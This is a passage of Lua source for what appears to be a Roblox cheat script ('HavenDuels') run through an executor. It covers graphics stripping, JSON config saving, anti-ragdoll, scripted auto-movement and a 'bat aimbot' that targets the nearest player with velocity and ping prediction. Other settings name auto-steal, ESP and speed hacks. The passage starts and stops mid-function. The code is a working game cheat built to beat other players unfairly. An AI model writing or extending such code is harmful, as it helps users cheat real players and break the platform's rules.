    for _, effect in ipairs(S.vividEffects or {}) do if effect == object then return true end end
    local parent = object
    while parent and parent ~= workspace do
        if parent:IsA("LayerCollector") or parent:IsA("GuiObject") or parent:IsA("GuiBase2d") then
            return true
        end
        local name = parent.Name or ""
        if name:match("^Crystal") or name:match("^Eclipse") or name:match("^ESP_")
            or name:match("^BloodHounds") or name:match("^Yout") or name:match("^Vision") then
            return true
        end
        parent = parent.Parent
    end
    return false
end

function YF.applyAntiLagDerender(obj)
    pcall(function()
        if not YF._alRunning then return end
        if YF._alIsProtectedVisual(obj) then return end

        if obj:IsA("Terrain") then
            YF._alChange(obj, "Decoration", false)
            YF._alChange(obj, "WaterWaveSize", 0)
            YF._alChange(obj, "WaterWaveSpeed", 0)
            YF._alChange(obj, "WaterReflectance", 0)
            YF._alChange(obj, "WaterTransparency", 1)
        end
        if obj:IsA("BasePart") then
            YF._alChange(obj, "Material", Enum.Material.Plastic)
            YF._alChange(obj, "MaterialVariant", "")
            YF._alChange(obj, "Reflectance", 0)
            YF._alChange(obj, "CastShadow", false)
            if obj:IsA("MeshPart") then
                YF._alChange(obj, "TextureID", "")
                YF._alChange(obj, "RenderFidelity", Enum.RenderFidelity.Performance)
                YF._alChange(obj, "DoubleSided", false)
            elseif obj:IsA("PartOperation") then
                YF._alChange(obj, "RenderFidelity", Enum.RenderFidelity.Performance)
            end
        elseif obj:IsA("SpecialMesh") then
            YF._alChange(obj, "TextureId", "")
        elseif obj:IsA("SurfaceAppearance") then
            YF._alDetached[obj] = true
            YF._alChange(obj, "Parent", nil)
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            YF._alChange(obj, "Transparency", 1)
            YF._alChange(obj, "Texture", "")
        elseif obj:IsA("ParticleEmitter") then
            YF._alChange(obj, "Enabled", false)
            YF._alChange(obj, "Rate", 0)
            pcall(function() obj:Clear() end)
        elseif obj:IsA("Trail") then
            YF._alChange(obj, "Enabled", false)
            pcall(function() obj:Clear() end)
        elseif obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke")
            or obj:IsA("Sparkles") or obj:IsA("Light") or obj:IsA("PostEffect")
            or obj:IsA("Clouds") then
            YF._alChange(obj, "Enabled", false)
        elseif obj:IsA("Atmosphere") then
            YF._alChange(obj, "Density", 0)
            YF._alChange(obj, "Haze", 0)
            YF._alChange(obj, "Glare", 0)
        elseif obj:IsA("Sky") then
            for _, face in ipairs({"SkyboxBk","SkyboxDn","SkyboxFt","SkyboxLf","SkyboxRt","SkyboxUp","SunTextureId","MoonTextureId"}) do
                YF._alChange(obj, face, "")
            end
            YF._alChange(obj, "StarCount", 0)
            YF._alChange(obj, "CelestialBodiesShown", false)
        elseif obj:IsA("Shirt") then
            YF._alChange(obj, "ShirtTemplate", "")
        elseif obj:IsA("Pants") then
            YF._alChange(obj, "PantsTemplate", "")
        elseif obj:IsA("ShirtGraphic") then
            YF._alChange(obj, "Graphic", "")
        elseif obj:IsA("Animator") then
            if not YF._alAnimators[obj] then
                local char = LP.Character
                if not (char and obj:IsDescendantOf(char)) then
                    YF._alAnimators[obj] = true
                    local token = YF._alGeneration
                    local ok, conn = pcall(function()
                        return obj.AnimationPlayed:Connect(function(track)
                            if not YF._alRunning or YF._alGeneration ~= token then return end
                            task.defer(function()
                                if YF._alRunning and YF._alGeneration == token then
                                    pcall(function() track:Stop(0) end)
                                end
                            end)
                        end)
                    end)
                    if ok then table.insert(YF._alConns, conn) end
                    pcall(function()
                        for _, track in ipairs(obj:GetPlayingAnimationTracks()) do
                            if track.IsPlaying then
                                YF._alStoppedTracks[track] = {
                                    animator = obj,
                                    time = track.TimePosition,
                                    speed = track.Speed,
                                }
                                track:Stop(0)
                            end
                        end
                    end)
                end
            end
        end
    end)
end

function YF.enableAntiLag()
    if YF._alRunning then return end
    YF._alRunning = true
    S.antiLagEnabled = true
    YF._alGeneration = YF._alGeneration + 1
    local token = YF._alGeneration

    YF._alSaveLighting()
    YF._alApplyLowFlags()
    YF._alApplyLowPermanentSettings()

    for _, delaySeconds in ipairs({2, 6, 12, 20}) do
        task.delay(delaySeconds, function()
            if YF._alRunning and YF._alGeneration == token then
                YF._alApplyLowFlags()
            end
        end)
    end

    pcall(function() game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen() end)

    table.insert(YF._alConns, workspace.DescendantAdded:Connect(function(obj)
        task.defer(function()
            if YF._alRunning and YF._alGeneration == token then
                pcall(YF.applyAntiLagDerender, obj)
            end
        end)
    end))
    table.insert(YF._alConns, Lighting.DescendantAdded:Connect(function(obj)
        task.defer(function()
            if YF._alRunning and YF._alGeneration == token then
                pcall(YF.applyAntiLagDerender, obj)
            end
        end)
    end))

    local function walkBatched(roots, apply, shouldContinue)
        task.spawn(function()
            local pending = {}
            for _, root in ipairs(roots) do
                if root then
                    local ok, children = pcall(function() return root:GetChildren() end)
                    if ok then for _, c in ipairs(children) do table.insert(pending, c) end end
                end
            end
            while #pending > 0 and YF._alRunning and YF._alGeneration == token and shouldContinue() do
                local deadline = os.clock() + 0.0008
                while #pending > 0 and os.clock() < deadline do
                    local obj = table.remove(pending)
                    pcall(apply, obj)
                    local ok, children = pcall(function() return obj:GetChildren() end)
                    if ok then for _, c in ipairs(children) do table.insert(pending, c) end end
                end
                RunService.Heartbeat:Wait()
            end
        end)
    end

    walkBatched({workspace, Lighting}, YF.applyAntiLagDerender, function()
        return YF._alRunning and YF._alGeneration == token
    end)
end

function YF.disableAntiLag()
    if not YF._alRunning then
        S.antiLagEnabled = false
        return
    end
    YF._alRunning = false
    S.antiLagEnabled = false
    YF._alGeneration = YF._alGeneration + 1

    if YF._alScanCancel then pcall(YF._alScanCancel); YF._alScanCancel = nil end

    for _, conn in ipairs(YF._alConns) do pcall(function() conn:Disconnect() end) end
    YF._alConns = {}

    for object, properties in pairs(YF._alSaved) do
        for property, original in pairs(properties) do
            pcall(function() object[property] = original.value end)
        end
    end
    YF._alSaved = setmetatable({}, { __mode = "k" })
    YF._alDetached = {}
    YF._alAnimators = setmetatable({}, { __mode = "k" })

    for track, state in pairs(YF._alStoppedTracks) do
        pcall(function()
            if state.animator.Parent and not track.IsPlaying then
                track:Play(0, 1, state.speed)
                track.TimePosition = state.time
            end
        end)
    end
    YF._alStoppedTracks = setmetatable({}, { __mode = "k" })

    if YF._alLightOrig then
        pcall(function()
            Lighting.Brightness = YF._alLightOrig.Brightness
            Lighting.ClockTime = YF._alLightOrig.ClockTime
            Lighting.OutdoorAmbient = YF._alLightOrig.OutdoorAmbient
            Lighting.Ambient = YF._alLightOrig.Ambient
            Lighting.GlobalShadows = YF._alLightOrig.GlobalShadows
            Lighting.EnvironmentDiffuseScale = YF._alLightOrig.EnvironmentDiffuseScale
            Lighting.EnvironmentSpecularScale = YF._alLightOrig.EnvironmentSpecularScale
            Lighting.FogStart = YF._alLightOrig.FogStart
            Lighting.FogEnd = YF._alLightOrig.FogEnd
        end)
    end
    pcall(function()
        if YF._alWorldOrig.renderQuality ~= nil then settings().Rendering.QualityLevel = YF._alWorldOrig.renderQuality end
        if YF._alWorldOrig.savedQuality ~= nil then UserSettings():GetService("UserGameSettings").SavedQualityLevel = YF._alWorldOrig.savedQuality end
        local terrain, state = YF._alWorldOrig.terrainObject, YF._alWorldOrig.terrain
        if terrain and terrain.Parent and state then
            for property, value in pairs(state) do terrain[property] = value end
        end
        local clouds = YF._alWorldOrig.cloudsObject
        if clouds and clouds.Parent and YF._alWorldOrig.cloudsEnabled ~= nil then clouds.Enabled = YF._alWorldOrig.cloudsEnabled end
        for atmosphere, values in pairs(YF._alWorldOrig.atmospheres or {}) do
            if atmosphere.Parent then for property, value in pairs(values) do atmosphere[property] = value end end
        end
    end)
    YF._alWorldOrig = {}
    local env = (getgenv and getgenv()) or _G
    local setter = rawget(env, "setfflag") or rawget(_G, "set_fflag")
    if type(setter) == "function" then
        for name, value in pairs(YF._alFlagOriginals) do pcall(setter, name, value) end
    end
    YF._alFlagOriginals = {}
end

saveConfig = function()
    local success, reason = false, nil
    local ok, err = pcall(function()
        local function ks(e)
            return {kb = e.kb and e.kb.Name or nil, gp = e.gp and e.gp.Name or nil}
        end
        local cfg = {
            keybindVersion = 1,
            normalSpeed = S.NS, carrySpeed = S.CS, laggerSpeed = S.LS, laggerCarrySpeed = S.LCS,
            backgroundAssetId = S.backgroundAssetId,
            laggerMode = S.speedMode and 0 or S.laggerMode,
            tpDownHeightTrigger = S.tpDownHeightTrigger,
            dropBrainrotKey = ks(S.KB.DropBrainrot), autoLeftKey = ks(S.KB.AutoLeft),
            autoRightKey = ks(S.KB.AutoRight), autoBatKey = ks(S.KB.AutoBat),
            tpBatKey = ks(S.KB.TpBat), tpFloorKey = ks(S.KB.TPFlor), guiHideKey = ks(S.KB.GuiHide),
            speedToggleKey = ks(S.KB.SpeedToggle), laggerToggleKey = ks(S.KB.LaggerToggle),
            instaResetKey = ks(S.KB.InstaReset),
            grabRadius = S.Steal.StealRadius, antiRagdoll = S.antiRagdollEnabled,
            autoStealEnabled = S.stealActive,
            autoCarryEnabled = S.autoCarryEnabled,
            medusaCounter = S.medusaCounterEnabled, carryMode = S.speedMode,
            batAimbot = S.batAimbotEnabled,
            tpBat = S.tpBatEnabled,
            batSkin = S.batSkinMode,
            displaySkin = S.displaySkin,
            customSkin = S.customSkinEnabled,
            espEnabled = S.espEnabled,
            unwalkEnabled = S.unwalkEnabled,
            lockUI = S.lockUIEnabled, fpsBoost = S.fpsBoostEnabled,
            vividGraphics = S.vividGraphicsEnabled,
            stretchEnabled = S.stretchEnabled, stretchFOV = S.stretchFOV,
            skyTheme = S.skyTheme,
            krobloxMode = S.krobloxMode,
            antiFling = S.antiFlingEnabled,
            lockEnemy = S.bodyLockEnabled, lockEnemyRange = S.bodyLockRange,
            animPack = S.currentAnimPack,
            antiLag = S.antiLagEnabled,
            hideOpiumButtons = S.hideOpiumButtonsEnabled or false,
            holdJumpEnabled = S.holdJumpEnabled,
            batCounter = S.batCounterEnabled,
            stealDuration = S.Steal.StealDuration,
            mobileButtonPositions = S.mobileButtonPositions,
            lockMobileButtons = S.lockMobileButtons,
            floatingFreeButtonPositions = S.floatingFreeButtonPositions,
            floatingPanelPos = S.floatingPanelFrame and {
                XS = S.floatingPanelFrame.Position.X.Scale, X = S.floatingPanelFrame.Position.X.Offset,
                YS = S.floatingPanelFrame.Position.Y.Scale, Y = S.floatingPanelFrame.Position.Y.Offset,
            } or nil,
            stealHudPos = S.stealHudCard and {
                XS = S.stealHudCard.Position.X.Scale, X = S.stealHudCard.Position.X.Offset,
                YS = S.stealHudCard.Position.Y.Scale, Y = S.stealHudCard.Position.Y.Offset,
            } or nil,
        }
        local encodedOk, data = pcall(function() return HS:JSONEncode(cfg) end)
        if not encodedOk or not data then error("JSONEncode failed") end
        local writeOk, writeErr = safeWritefile(S.CONFIG_FILE, data)
        if not writeOk then error(tostring(writeErr or "write failed")) end

        -- Backup para evitar perder los ajustes si el executor falla al conservar
        -- el archivo principal. No sustituye al archivo principal.
        pcall(function()
            safeWritefile("HavenDuels_backup.json", data)
        end)

        -- Verificación inmediata: si el executor permite leer archivos,
        -- comprobamos que realmente quedó escrito el JSON.
        if type(readfile) == "function" then
            local verifyOk, verifyData = pcall(readfile, S.CONFIG_FILE)
            if not verifyOk or type(verifyData) ~= "string" or #verifyData == 0 then
                error("el archivo no pudo verificarse después de guardar")
            end
            local jsonOk = pcall(function() HS:JSONDecode(verifyData) end)
            if not jsonOk then error("el archivo guardado no contiene JSON válido") end
        end
        success = true
    end)
    if not ok then reason = tostring(err) end
    return success, reason
end

task.spawn(function()
    while task.wait(10) do
        saveConfig()
    end
end)

local function resetFloatingPanel()
    S.mobileButtonPositions = {}
    S.floatingFreeButtonPositions = {}
    if S.floatingPanelFrame then
        S.floatingPanelFrame.Position = UDim2.new(0.79, 0, 0, 0)
    end
    if S._floatingFreeButtonLayer then
        S._floatingFreeButtonLayer.Position = UDim2.new(0.79, 0, 0, 0)
    end
    if S.stealHudCard then
        S.stealHudCard.Position = UDim2.new(0.5, -150, 1, -75)
    end
    for _, info in ipairs(S._floatingButtonInfos or {}) do
        info.userMoved = false
    end
    if S._floatingUpdateLayout then pcall(S._floatingUpdateLayout) end
    saveConfig()
end

local function resetProgressBar()
    if S.progressPct then S.progressPct.Text = "0%" end
    if S.progressFill then S.progressFill.Size = UDim2.new(0, 0, 1, 0) end
    -- Bar always stays visible; just reset fill width
end

AntiRagdollV2 = {
    Enabled = false,
    Connection = nil,
    ResetCooldown = 0,
}

local function startAntiRagdollV2()
    if AntiRagdollV2.Connection then return end
    AntiRagdollV2.Enabled = true
    AntiRagdollV2.Connection = RunService.Heartbeat:Connect(function()
        if not AntiRagdollV2.Enabled or not S.antiRagdollEnabled then return end
        local character = LP.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local root = character:FindFirstChild("HumanoidRootPart")
        if not humanoid or not root then return end
        if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead then return end

        local state = humanoid:GetState()
        local now = tick()
        if state == Enum.HumanoidStateType.Physics
            or state == Enum.HumanoidStateType.Ragdoll
            or state == Enum.HumanoidStateType.FallingDown then
            if now - AntiRagdollV2.ResetCooldown > 0.15 then
                AntiRagdollV2.ResetCooldown = now
                -- Disparar el contador antes de que V2 cambie el estado a GettingUp.
                if triggerBatCounter then triggerBatCounter(character) end
                pcall(function()
                    if humanoid:GetState() == Enum.HumanoidStateType.GettingUp then return end
                    if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead then return end
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                    root.Velocity = Vector3.zero
                    root.RotVelocity = Vector3.zero
                    root.AssemblyLinearVelocity = Vector3.zero
                    root.AssemblyAngularVelocity = Vector3.zero
                    for _, obj in ipairs(character:GetDescendants()) do
                        if obj:IsA("Motor6D") then obj.Enabled = true end
                        if obj:IsA("Constraint") then obj.Enabled = true end
                    end
                    local camera = workspace.CurrentCamera
                    if camera then camera.CameraSubject = humanoid end
                    local playerScripts = LP:FindFirstChild("PlayerScripts")
                    local playerModule = playerScripts and playerScripts:FindFirstChild("PlayerModule")
                    local controlModule = playerModule and playerModule:FindFirstChild("ControlModule")
                    if controlModule then
                        local controls = require(controlModule)
                        if controls and controls.Enable then controls:Enable() end
                    end
                    humanoid.AutoRotate = true
                    humanoid.PlatformStand = false
                    humanoid.Sit = false
                end)
            end
        end
    end)
end

local function stopAntiRagdollV2()
    AntiRagdollV2.Enabled = false
    if AntiRagdollV2.Connection then
        AntiRagdollV2.Connection:Disconnect()
        AntiRagdollV2.Connection = nil
    end
    AntiRagdollV2.ResetCooldown = 0
end

startAntiRagdoll = function()
    startAntiRagdollV2()
end

stopAntiRagdoll = function()
    stopAntiRagdollV2()
end

local function toggleAntiRag(on)
    S.antiRagdollEnabled = (on == true)
    if S.antiRagdollEnabled then startAntiRagdoll() else stopAntiRagdoll() end
end

savedAnimate = nil

local function startUnwalk()
    local c = LP.Character
    if not c then return end
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then
        for _, t in ipairs(hum:GetPlayingAnimationTracks()) do
            t:Stop()
        end
    end
    local anim = c:FindFirstChild("Animate")
    if anim then
        if not savedAnimate then
            savedAnimate = anim:Clone()
        end
        anim:Destroy()
    end
    S.unwalkEnabled = true
end

local function stopUnwalk()
    if not S.unwalkEnabled then return end
    S.unwalkEnabled = false
    local c = LP.Character
    if c and savedAnimate then
        local existing = c:FindFirstChild("Animate")
        if existing and existing ~= savedAnimate then existing:Destroy() end
        savedAnimate.Parent = c
        savedAnimate.Disabled = false
        savedAnimate = nil
    end
end

POS = S.AP

function stopAutoLeft()
    if S.alConn then S.alConn:Disconnect(); S.alConn = nil end
    S.alPhase = 1
    local c = LP.Character
    if c then
        local hum = c:FindFirstChildOfClass("Humanoid")
        if hum then hum:Move(Vector3.zero, false) end
    end
    if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end
end

function stopAutoRight()
    if S.arConn then S.arConn:Disconnect(); S.arConn = nil end
    S.arPhase = 1
    local c = LP.Character
    if c then
        local hum = c:FindFirstChildOfClass("Humanoid")
        if hum then hum:Move(Vector3.zero, false) end
    end
    if S.autoRightSetVisual then S.autoRightSetVisual(false) end
end

function startAutoLeft()
    if S.alConn then S.alConn:Disconnect() end
    S.alPhase = 1
    S.alConn = RunService.Heartbeat:Connect(function()
        if not S.autoLeftEnabled or S._youtResetInProgress then return end
        local c = LP.Character; if not c then return end
        local root = c:FindFirstChild("HumanoidRootPart")
        local hum = c:FindFirstChildOfClass("Humanoid")
        if not root or not hum or hum.Health <= 0 then return end
        if isSpeedRagdollState(hum) then
            hum:Move(Vector3.zero, false)
            return
        end
        local spd = S.getAutoPathSpeed()
        if S.alPhase == 1 then
            local tgt = Vector3.new(POS.L1.X, root.Position.Y, POS.L1.Z)
            if (tgt - root.Position).Magnitude < 1 then
                S.alPhase = 2
                local d = POS.L2 - root.Position
                local mv = Vector3.new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.Velocity = Vector3.new(mv.X * spd, root.Velocity.Y, mv.Z * spd)
                return
            end
            local d = POS.L1 - root.Position
            local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.Velocity = Vector3.new(mv.X * spd, root.Velocity.Y, mv.Z * spd)
        elseif S.alPhase == 2 then
            local tgt = Vector3.new(POS.L2.X, root.Position.Y, POS.L2.Z)
            if (tgt - root.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                root.Velocity = Vector3.zero
                S.autoLeftEnabled = false
                if S.alConn then S.alConn:Disconnect(); S.alConn = nil end
                S.alPhase = 1
                if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end
                if S._setPButtonActive and S._btnAAL then
                    S._setPButtonActive(S._btnAAL, S._bsAAL, S._l1AAL, S._l2AAL, false)
                end
                task.defer(S.startMovement)
                return
            end
            local d = POS.L2 - root.Position
            local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.Velocity = Vector3.new(mv.X * spd, root.Velocity.Y, mv.Z * spd)
        end
    end)
end

function startAutoRight()
    if S.arConn then S.arConn:Disconnect() end
    S.arPhase = 1
    S.arConn = RunService.Heartbeat:Connect(function()
        if not S.autoRightEnabled or S._youtResetInProgress then return end
        local c = LP.Character; if not c then return end
        local root = c:FindFirstChild("HumanoidRootPart")
        local hum = c:FindFirstChildOfClass("Humanoid")
        if not root or not hum or hum.Health <= 0 then return end
        if isSpeedRagdollState(hum) then
            hum:Move(Vector3.zero, false)
            return
        end
        local spd = S.getAutoPathSpeed()
        if S.arPhase == 1 then
            local tgt = Vector3.new(POS.R1.X, root.Position.Y, POS.R1.Z)
            if (tgt - root.Position).Magnitude < 1 then
                S.arPhase = 2
                local d = POS.R2 - root.Position
                local mv = Vector3.new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.Velocity = Vector3.new(mv.X * spd, root.Velocity.Y, mv.Z * spd)
                return
            end
            local d = POS.R1 - root.Position
            local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.Velocity = Vector3.new(mv.X * spd, root.Velocity.Y, mv.Z * spd)
        elseif S.arPhase == 2 then
            local tgt = Vector3.new(POS.R2.X, root.Position.Y, POS.R2.Z)
            if (tgt - root.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                root.Velocity = Vector3.zero
                S.autoRightEnabled = false
                if S.arConn then S.arConn:Disconnect(); S.arConn = nil end
                S.arPhase = 1
                if S.autoRightSetVisual then S.autoRightSetVisual(false) end
                if S._setPButtonActive and S._btnAAR then
                    S._setPButtonActive(S._btnAAR, S._bsAAR, S._l1AAR, S._l2AAR, false)
                end
                task.defer(S.startMovement)
                return
            end
            local d = POS.R2 - root.Position
            local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.Velocity = Vector3.new(mv.X * spd, root.Velocity.Y, mv.Z * spd)
        end
    end)
end

-- Auto Path must never keep steering a new character after any reset/respawn.
LP.CharacterRemoving:Connect(function()
    S.autoLeftEnabled = false
    S.autoRightEnabled = false
    pcall(stopAutoLeft)
    pcall(stopAutoRight)
    if S._setPButtonActive and S._btnAAL then
        pcall(S._setPButtonActive, S._btnAAL, S._bsAAL, S._l1AAL, S._l2AAL, false)
    end
    if S._setPButtonActive and S._btnAAR then
        pcall(S._setPButtonActive, S._btnAAR, S._bsAAR, S._l1AAR, S._l2AAR, false)
    end
    if S.stopMovement then pcall(S.stopMovement) end
end)

_bubbleBatAim = {
    targetPlayer = nil,
    lastTargetPos = nil,
    targetVelocity = Vector3.zero,
    smoothedVelocity = Vector3.zero,
    velocityHistory = {},
    accelerationHistory = {},
    aerialVelocityHistory = {},
    previousDirection = nil,
    lastDirectionChangeTime = 0,
    airborneTime = 0,
    lastActivationTime = 0,
    currentPing = 0.1,
    realPingMs = 0,
    lastPingCheck = 0,
}

BUBBLE_BAT_AIM = {
    ACTIVATE_DISTANCE = 13,
    MIN_FOLLOW_DISTANCE = 1,
    PREDICTION_TIME = 0.22,
    PREDICT_AHEAD = 3,
    MAX_VELOCITY_CHANGE = 150,
    VELOCITY_SMOOTHING = 0.2,
    MAX_HORIZONTAL_VELOCITY = 80,
    SERVER_TICKRATE = 1 / 60,
    MIN_PING_COMPENSATION = 0.03,
    MAX_PING_COMPENSATION = 0.25,
    ACCELERATION_PREDICTION_WEIGHT = 0.3,
    DIRECTION_CHANGE_DETECTION_TIME = 0.12,
    QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5,
    GRAVITY = 196.2,
    AIR_CONTROL_FACTOR = 0.8,
    MIN_AIRBORNE_TIME = 0.08,
}
_batAimLastWarn = 0

local function bubbleAverage(list)
    if #list == 0 then return Vector3.zero end
    local sum = Vector3.zero
    for _, value in ipairs(list) do sum = sum + value end
    return sum / #list
end

local function bubblePush(list, value, maxCount)
    table.insert(list, value)
    if #list > maxCount then table.remove(list, 1) end
end

local function bubbleResetAimState()
    _bubbleBatAim.targetPlayer = nil
    _bubbleBatAim.lastTargetPos = nil
    _bubbleBatAim.targetVelocity = Vector3.zero
    _bubbleBatAim.smoothedVelocity = Vector3.zero
    _bubbleBatAim.velocityHistory = {}
    _bubbleBatAim.accelerationHistory = {}
    _bubbleBatAim.aerialVelocityHistory = {}
    _bubbleBatAim.previousDirection = nil
    _bubbleBatAim.airborneTime = 0
    _bubbleBatAim.lastActivationTime = 0
end

local function findAimbotBat(character)
    if not character then return nil end
    local backpack = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
    local function isBatTool(item)
        if not item or not item:IsA("Tool") then return false end
        local name = string.lower(item.Name)
        return name:find("bat", 1, true) ~= nil or name:find("slap", 1, true) ~= nil
    end
    for _, item in ipairs(character:GetChildren()) do
        if isBatTool(item) then return item end
    end
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if isBatTool(item) then return item end
        end
    end
    return nil
end

local function getAutoBatTarget()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local now = tick()
    if now - S._autoBatLastScan <= 0.1 and S._autoBatTarget and S._autoBatTarget.Parent then
        local hum = S._autoBatTarget.Parent:FindFirstChildOfClass("Humanoid")
        if hum and hum.Health > 0 then return S._autoBatTarget end
    end
    S._autoBatLastScan = now
    S._autoBatTarget = nil
    local closest, minDist = nil, math.huge
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP and player.Character then
            local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
            local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
                local distance = (targetRoot.Position - root.Position).Magnitude
                if distance < minDist then
                    minDist = distance
                    closest = targetRoot
                end
            end
        end
    end
    S._autoBatTarget = closest
    return closest
end

_batAimPreviousAutoRotate = nil
S.resetAutoBatMotion = function()
    local character = LP.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if root then
        root.AssemblyAngularVelocity = Vector3.zero
        local velocity = root.AssemblyLinearVelocity
        root.AssemblyLinearVelocity = Vector3.new(velocity.X * 0.3, velocity.Y, velocity.Z * 0.3)
    end
    if humanoid then
        humanoid.AutoRotate = (_batAimPreviousAutoRotate == nil) and true or _batAimPreviousAutoRotate
    end
    _batAimPreviousAutoRotate = nil
end

local function enableAutoBat()
    if S.autoLeftEnabled then
        S.autoLeftEnabled = false
        if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end
        stopAutoLeft()
    end
    if S.autoRightEnabled then
        S.autoRightEnabled = false
        if S.autoRightSetVisual then S.autoRightSetVisual(false) end
        stopAutoRight()
    end
    S.autoBatEquippedThisRun = false
    S.batAimbotEnabled = true
end

local function disableAutoBat()
    if S.batAimbotConn then
        S.batAimbotConn:Disconnect()
        S.batAimbotConn = nil
    end
    S.batAimbotEnabled = false
    S.autoBatEquippedThisRun = false
    S._autoBatTarget = nil
    bubbleResetAimState()
    S.resetAutoBatMotion()
end

local function queueAutoBatStart()
    enableAutoBat()
end

function startBatAimbot()
    if S.batAimbotConn then
        S.batAimbotConn:Disconnect()
        S.batAimbotConn = nil
    end
    queueAutoBatStart()
    bubbleResetAimState()
    S.batAimbotConn = RunService.RenderStepped:Connect(function(deltaTime)
        if not S.batAimbotEnabled then return end
        local character = LP.Character
        local root = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if not root or not humanoid or humanoid.Health <= 0 then return end

        local ok, err = pcall(function()
            if _batAimPreviousAutoRotate == nil then
                _batAimPreviousAutoRotate = humanoid.AutoRotate
            end
            humanoid.AutoRotate = false

            local bat = findAimbotBat(character)
            if bat and bat.Parent ~= character then
                pcall(function() humanoid:EquipTool(bat) end)
            end

            if tick() - (_bubbleBatAim.lastPingCheck or 0) >= 0.5 then
                _bubbleBatAim.lastPingCheck = tick()
                local pingOk, ping = pcall(function()
                    return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
                end)
                if pingOk and type(ping) == "number" then
                    _bubbleBatAim.realPingMs = math.floor(ping)
                end
                _bubbleBatAim.currentPing = math.clamp(
                    _bubbleBatAim.realPingMs / 1000,
                    BUBBLE_BAT_AIM.MIN_PING_COMPENSATION,
                    BUBBLE_BAT_AIM.MAX_PING_COMPENSATION
                )
            end

            local targetRoot = getAutoBatTarget()
            local targetCharacter = targetRoot and targetRoot.Parent
            local targetPlayer = targetCharacter and Players:GetPlayerFromCharacter(targetCharacter)
            local targetHumanoid = targetCharacter and targetCharacter:FindFirstChildOfClass("Humanoid")
            if not targetPlayer or not targetRoot or not targetHumanoid or targetHumanoid.Health <= 0 then
                bubbleResetAimState()
                root.AssemblyAngularVelocity = Vector3.zero
                local velocity = root.AssemblyLinearVelocity
                root.AssemblyLinearVelocity = Vector3.new(0, velocity.Y * 0.5, 0)
                return
            end

            if _bubbleBatAim.targetPlayer ~= targetPlayer then
                bubbleResetAimState()
                _bubbleBatAim.targetPlayer = targetPlayer
                _bubbleBatAim.lastTargetPos = targetRoot.Position
                _bubbleBatAim.targetVelocity = targetRoot.AssemblyLinearVelocity
                _bubbleBatAim.smoothedVelocity = targetRoot.AssemblyLinearVelocity
            end

            local targetPosition = targetRoot.Position
            local dt = math.max(deltaTime or 0, 1 / 240)
            if _bubbleBatAim.lastTargetPos then
                local velocity = (targetPosition - _bubbleBatAim.lastTargetPos) / dt
                local change = velocity - _bubbleBatAim.targetVelocity
                if change.Magnitude > BUBBLE_BAT_AIM.MAX_VELOCITY_CHANGE then
                    velocity = _bubbleBatAim.targetVelocity + change.Unit * BUBBLE_BAT_AIM.MAX_VELOCITY_CHANGE
                end
                local horizontal = Vector3.new(velocity.X, 0, velocity.Z)
                if horizontal.Magnitude > BUBBLE_BAT_AIM.MAX_HORIZONTAL_VELOCITY then
                    horizontal = horizontal.Unit * BUBBLE_BAT_AIM.MAX_HORIZONTAL_VELOCITY
                    velocity = Vector3.new(horizontal.X, velocity.Y, horizontal.Z)
                end
                bubblePush(_bubbleBatAim.accelerationHistory, (velocity - _bubbleBatAim.targetVelocity) / dt, 4)
                bubblePush(_bubbleBatAim.velocityHistory, velocity, 8)
                _bubbleBatAim.targetVelocity = velocity
                _bubbleBatAim.smoothedVelocity = _bubbleBatAim.smoothedVelocity:Lerp(velocity, BUBBLE_BAT_AIM.VELOCITY_SMOOTHING)
            end
            _bubbleBatAim.lastTargetPos = targetPosition

            local airborne = targetHumanoid.FloorMaterial == Enum.Material.Air
            _bubbleBatAim.airborneTime = airborne and (_bubbleBatAim.airborneTime + dt) or 0
            if airborne and _bubbleBatAim.airborneTime >= BUBBLE_BAT_AIM.MIN_AIRBORNE_TIME then
                bubblePush(_bubbleBatAim.aerialVelocityHistory, _bubbleBatAim.targetVelocity, 6)
            elseif not airborne then
                _bubbleBatAim.aerialVelocityHistory = {}
            end
            local velocity = _bubbleBatAim.smoothedVelocity
            if airborne and #_bubbleBatAim.aerialVelocityHistory > 0 then
                local aerial = bubbleAverage(_bubbleBatAim.aerialVelocityHistory)
                velocity = Vector3.new(aerial.X, _bubbleBatAim.targetVelocity.Y, aerial.Z) * BUBBLE_BAT_AIM.AIR_CONTROL_FACTOR
            end

            local quickChange = false
            local horizontalVelocity = Vector3.new(_bubbleBatAim.targetVelocity.X, 0, _bubbleBatAim.targetVelocity.Z)
            if horizontalVelocity.Magnitude > 5 then
                local direction = horizontalVelocity.Unit
                if _bubbleBatAim.previousDirection and _bubbleBatAim.previousDirection:Dot(direction) < 0.5 then
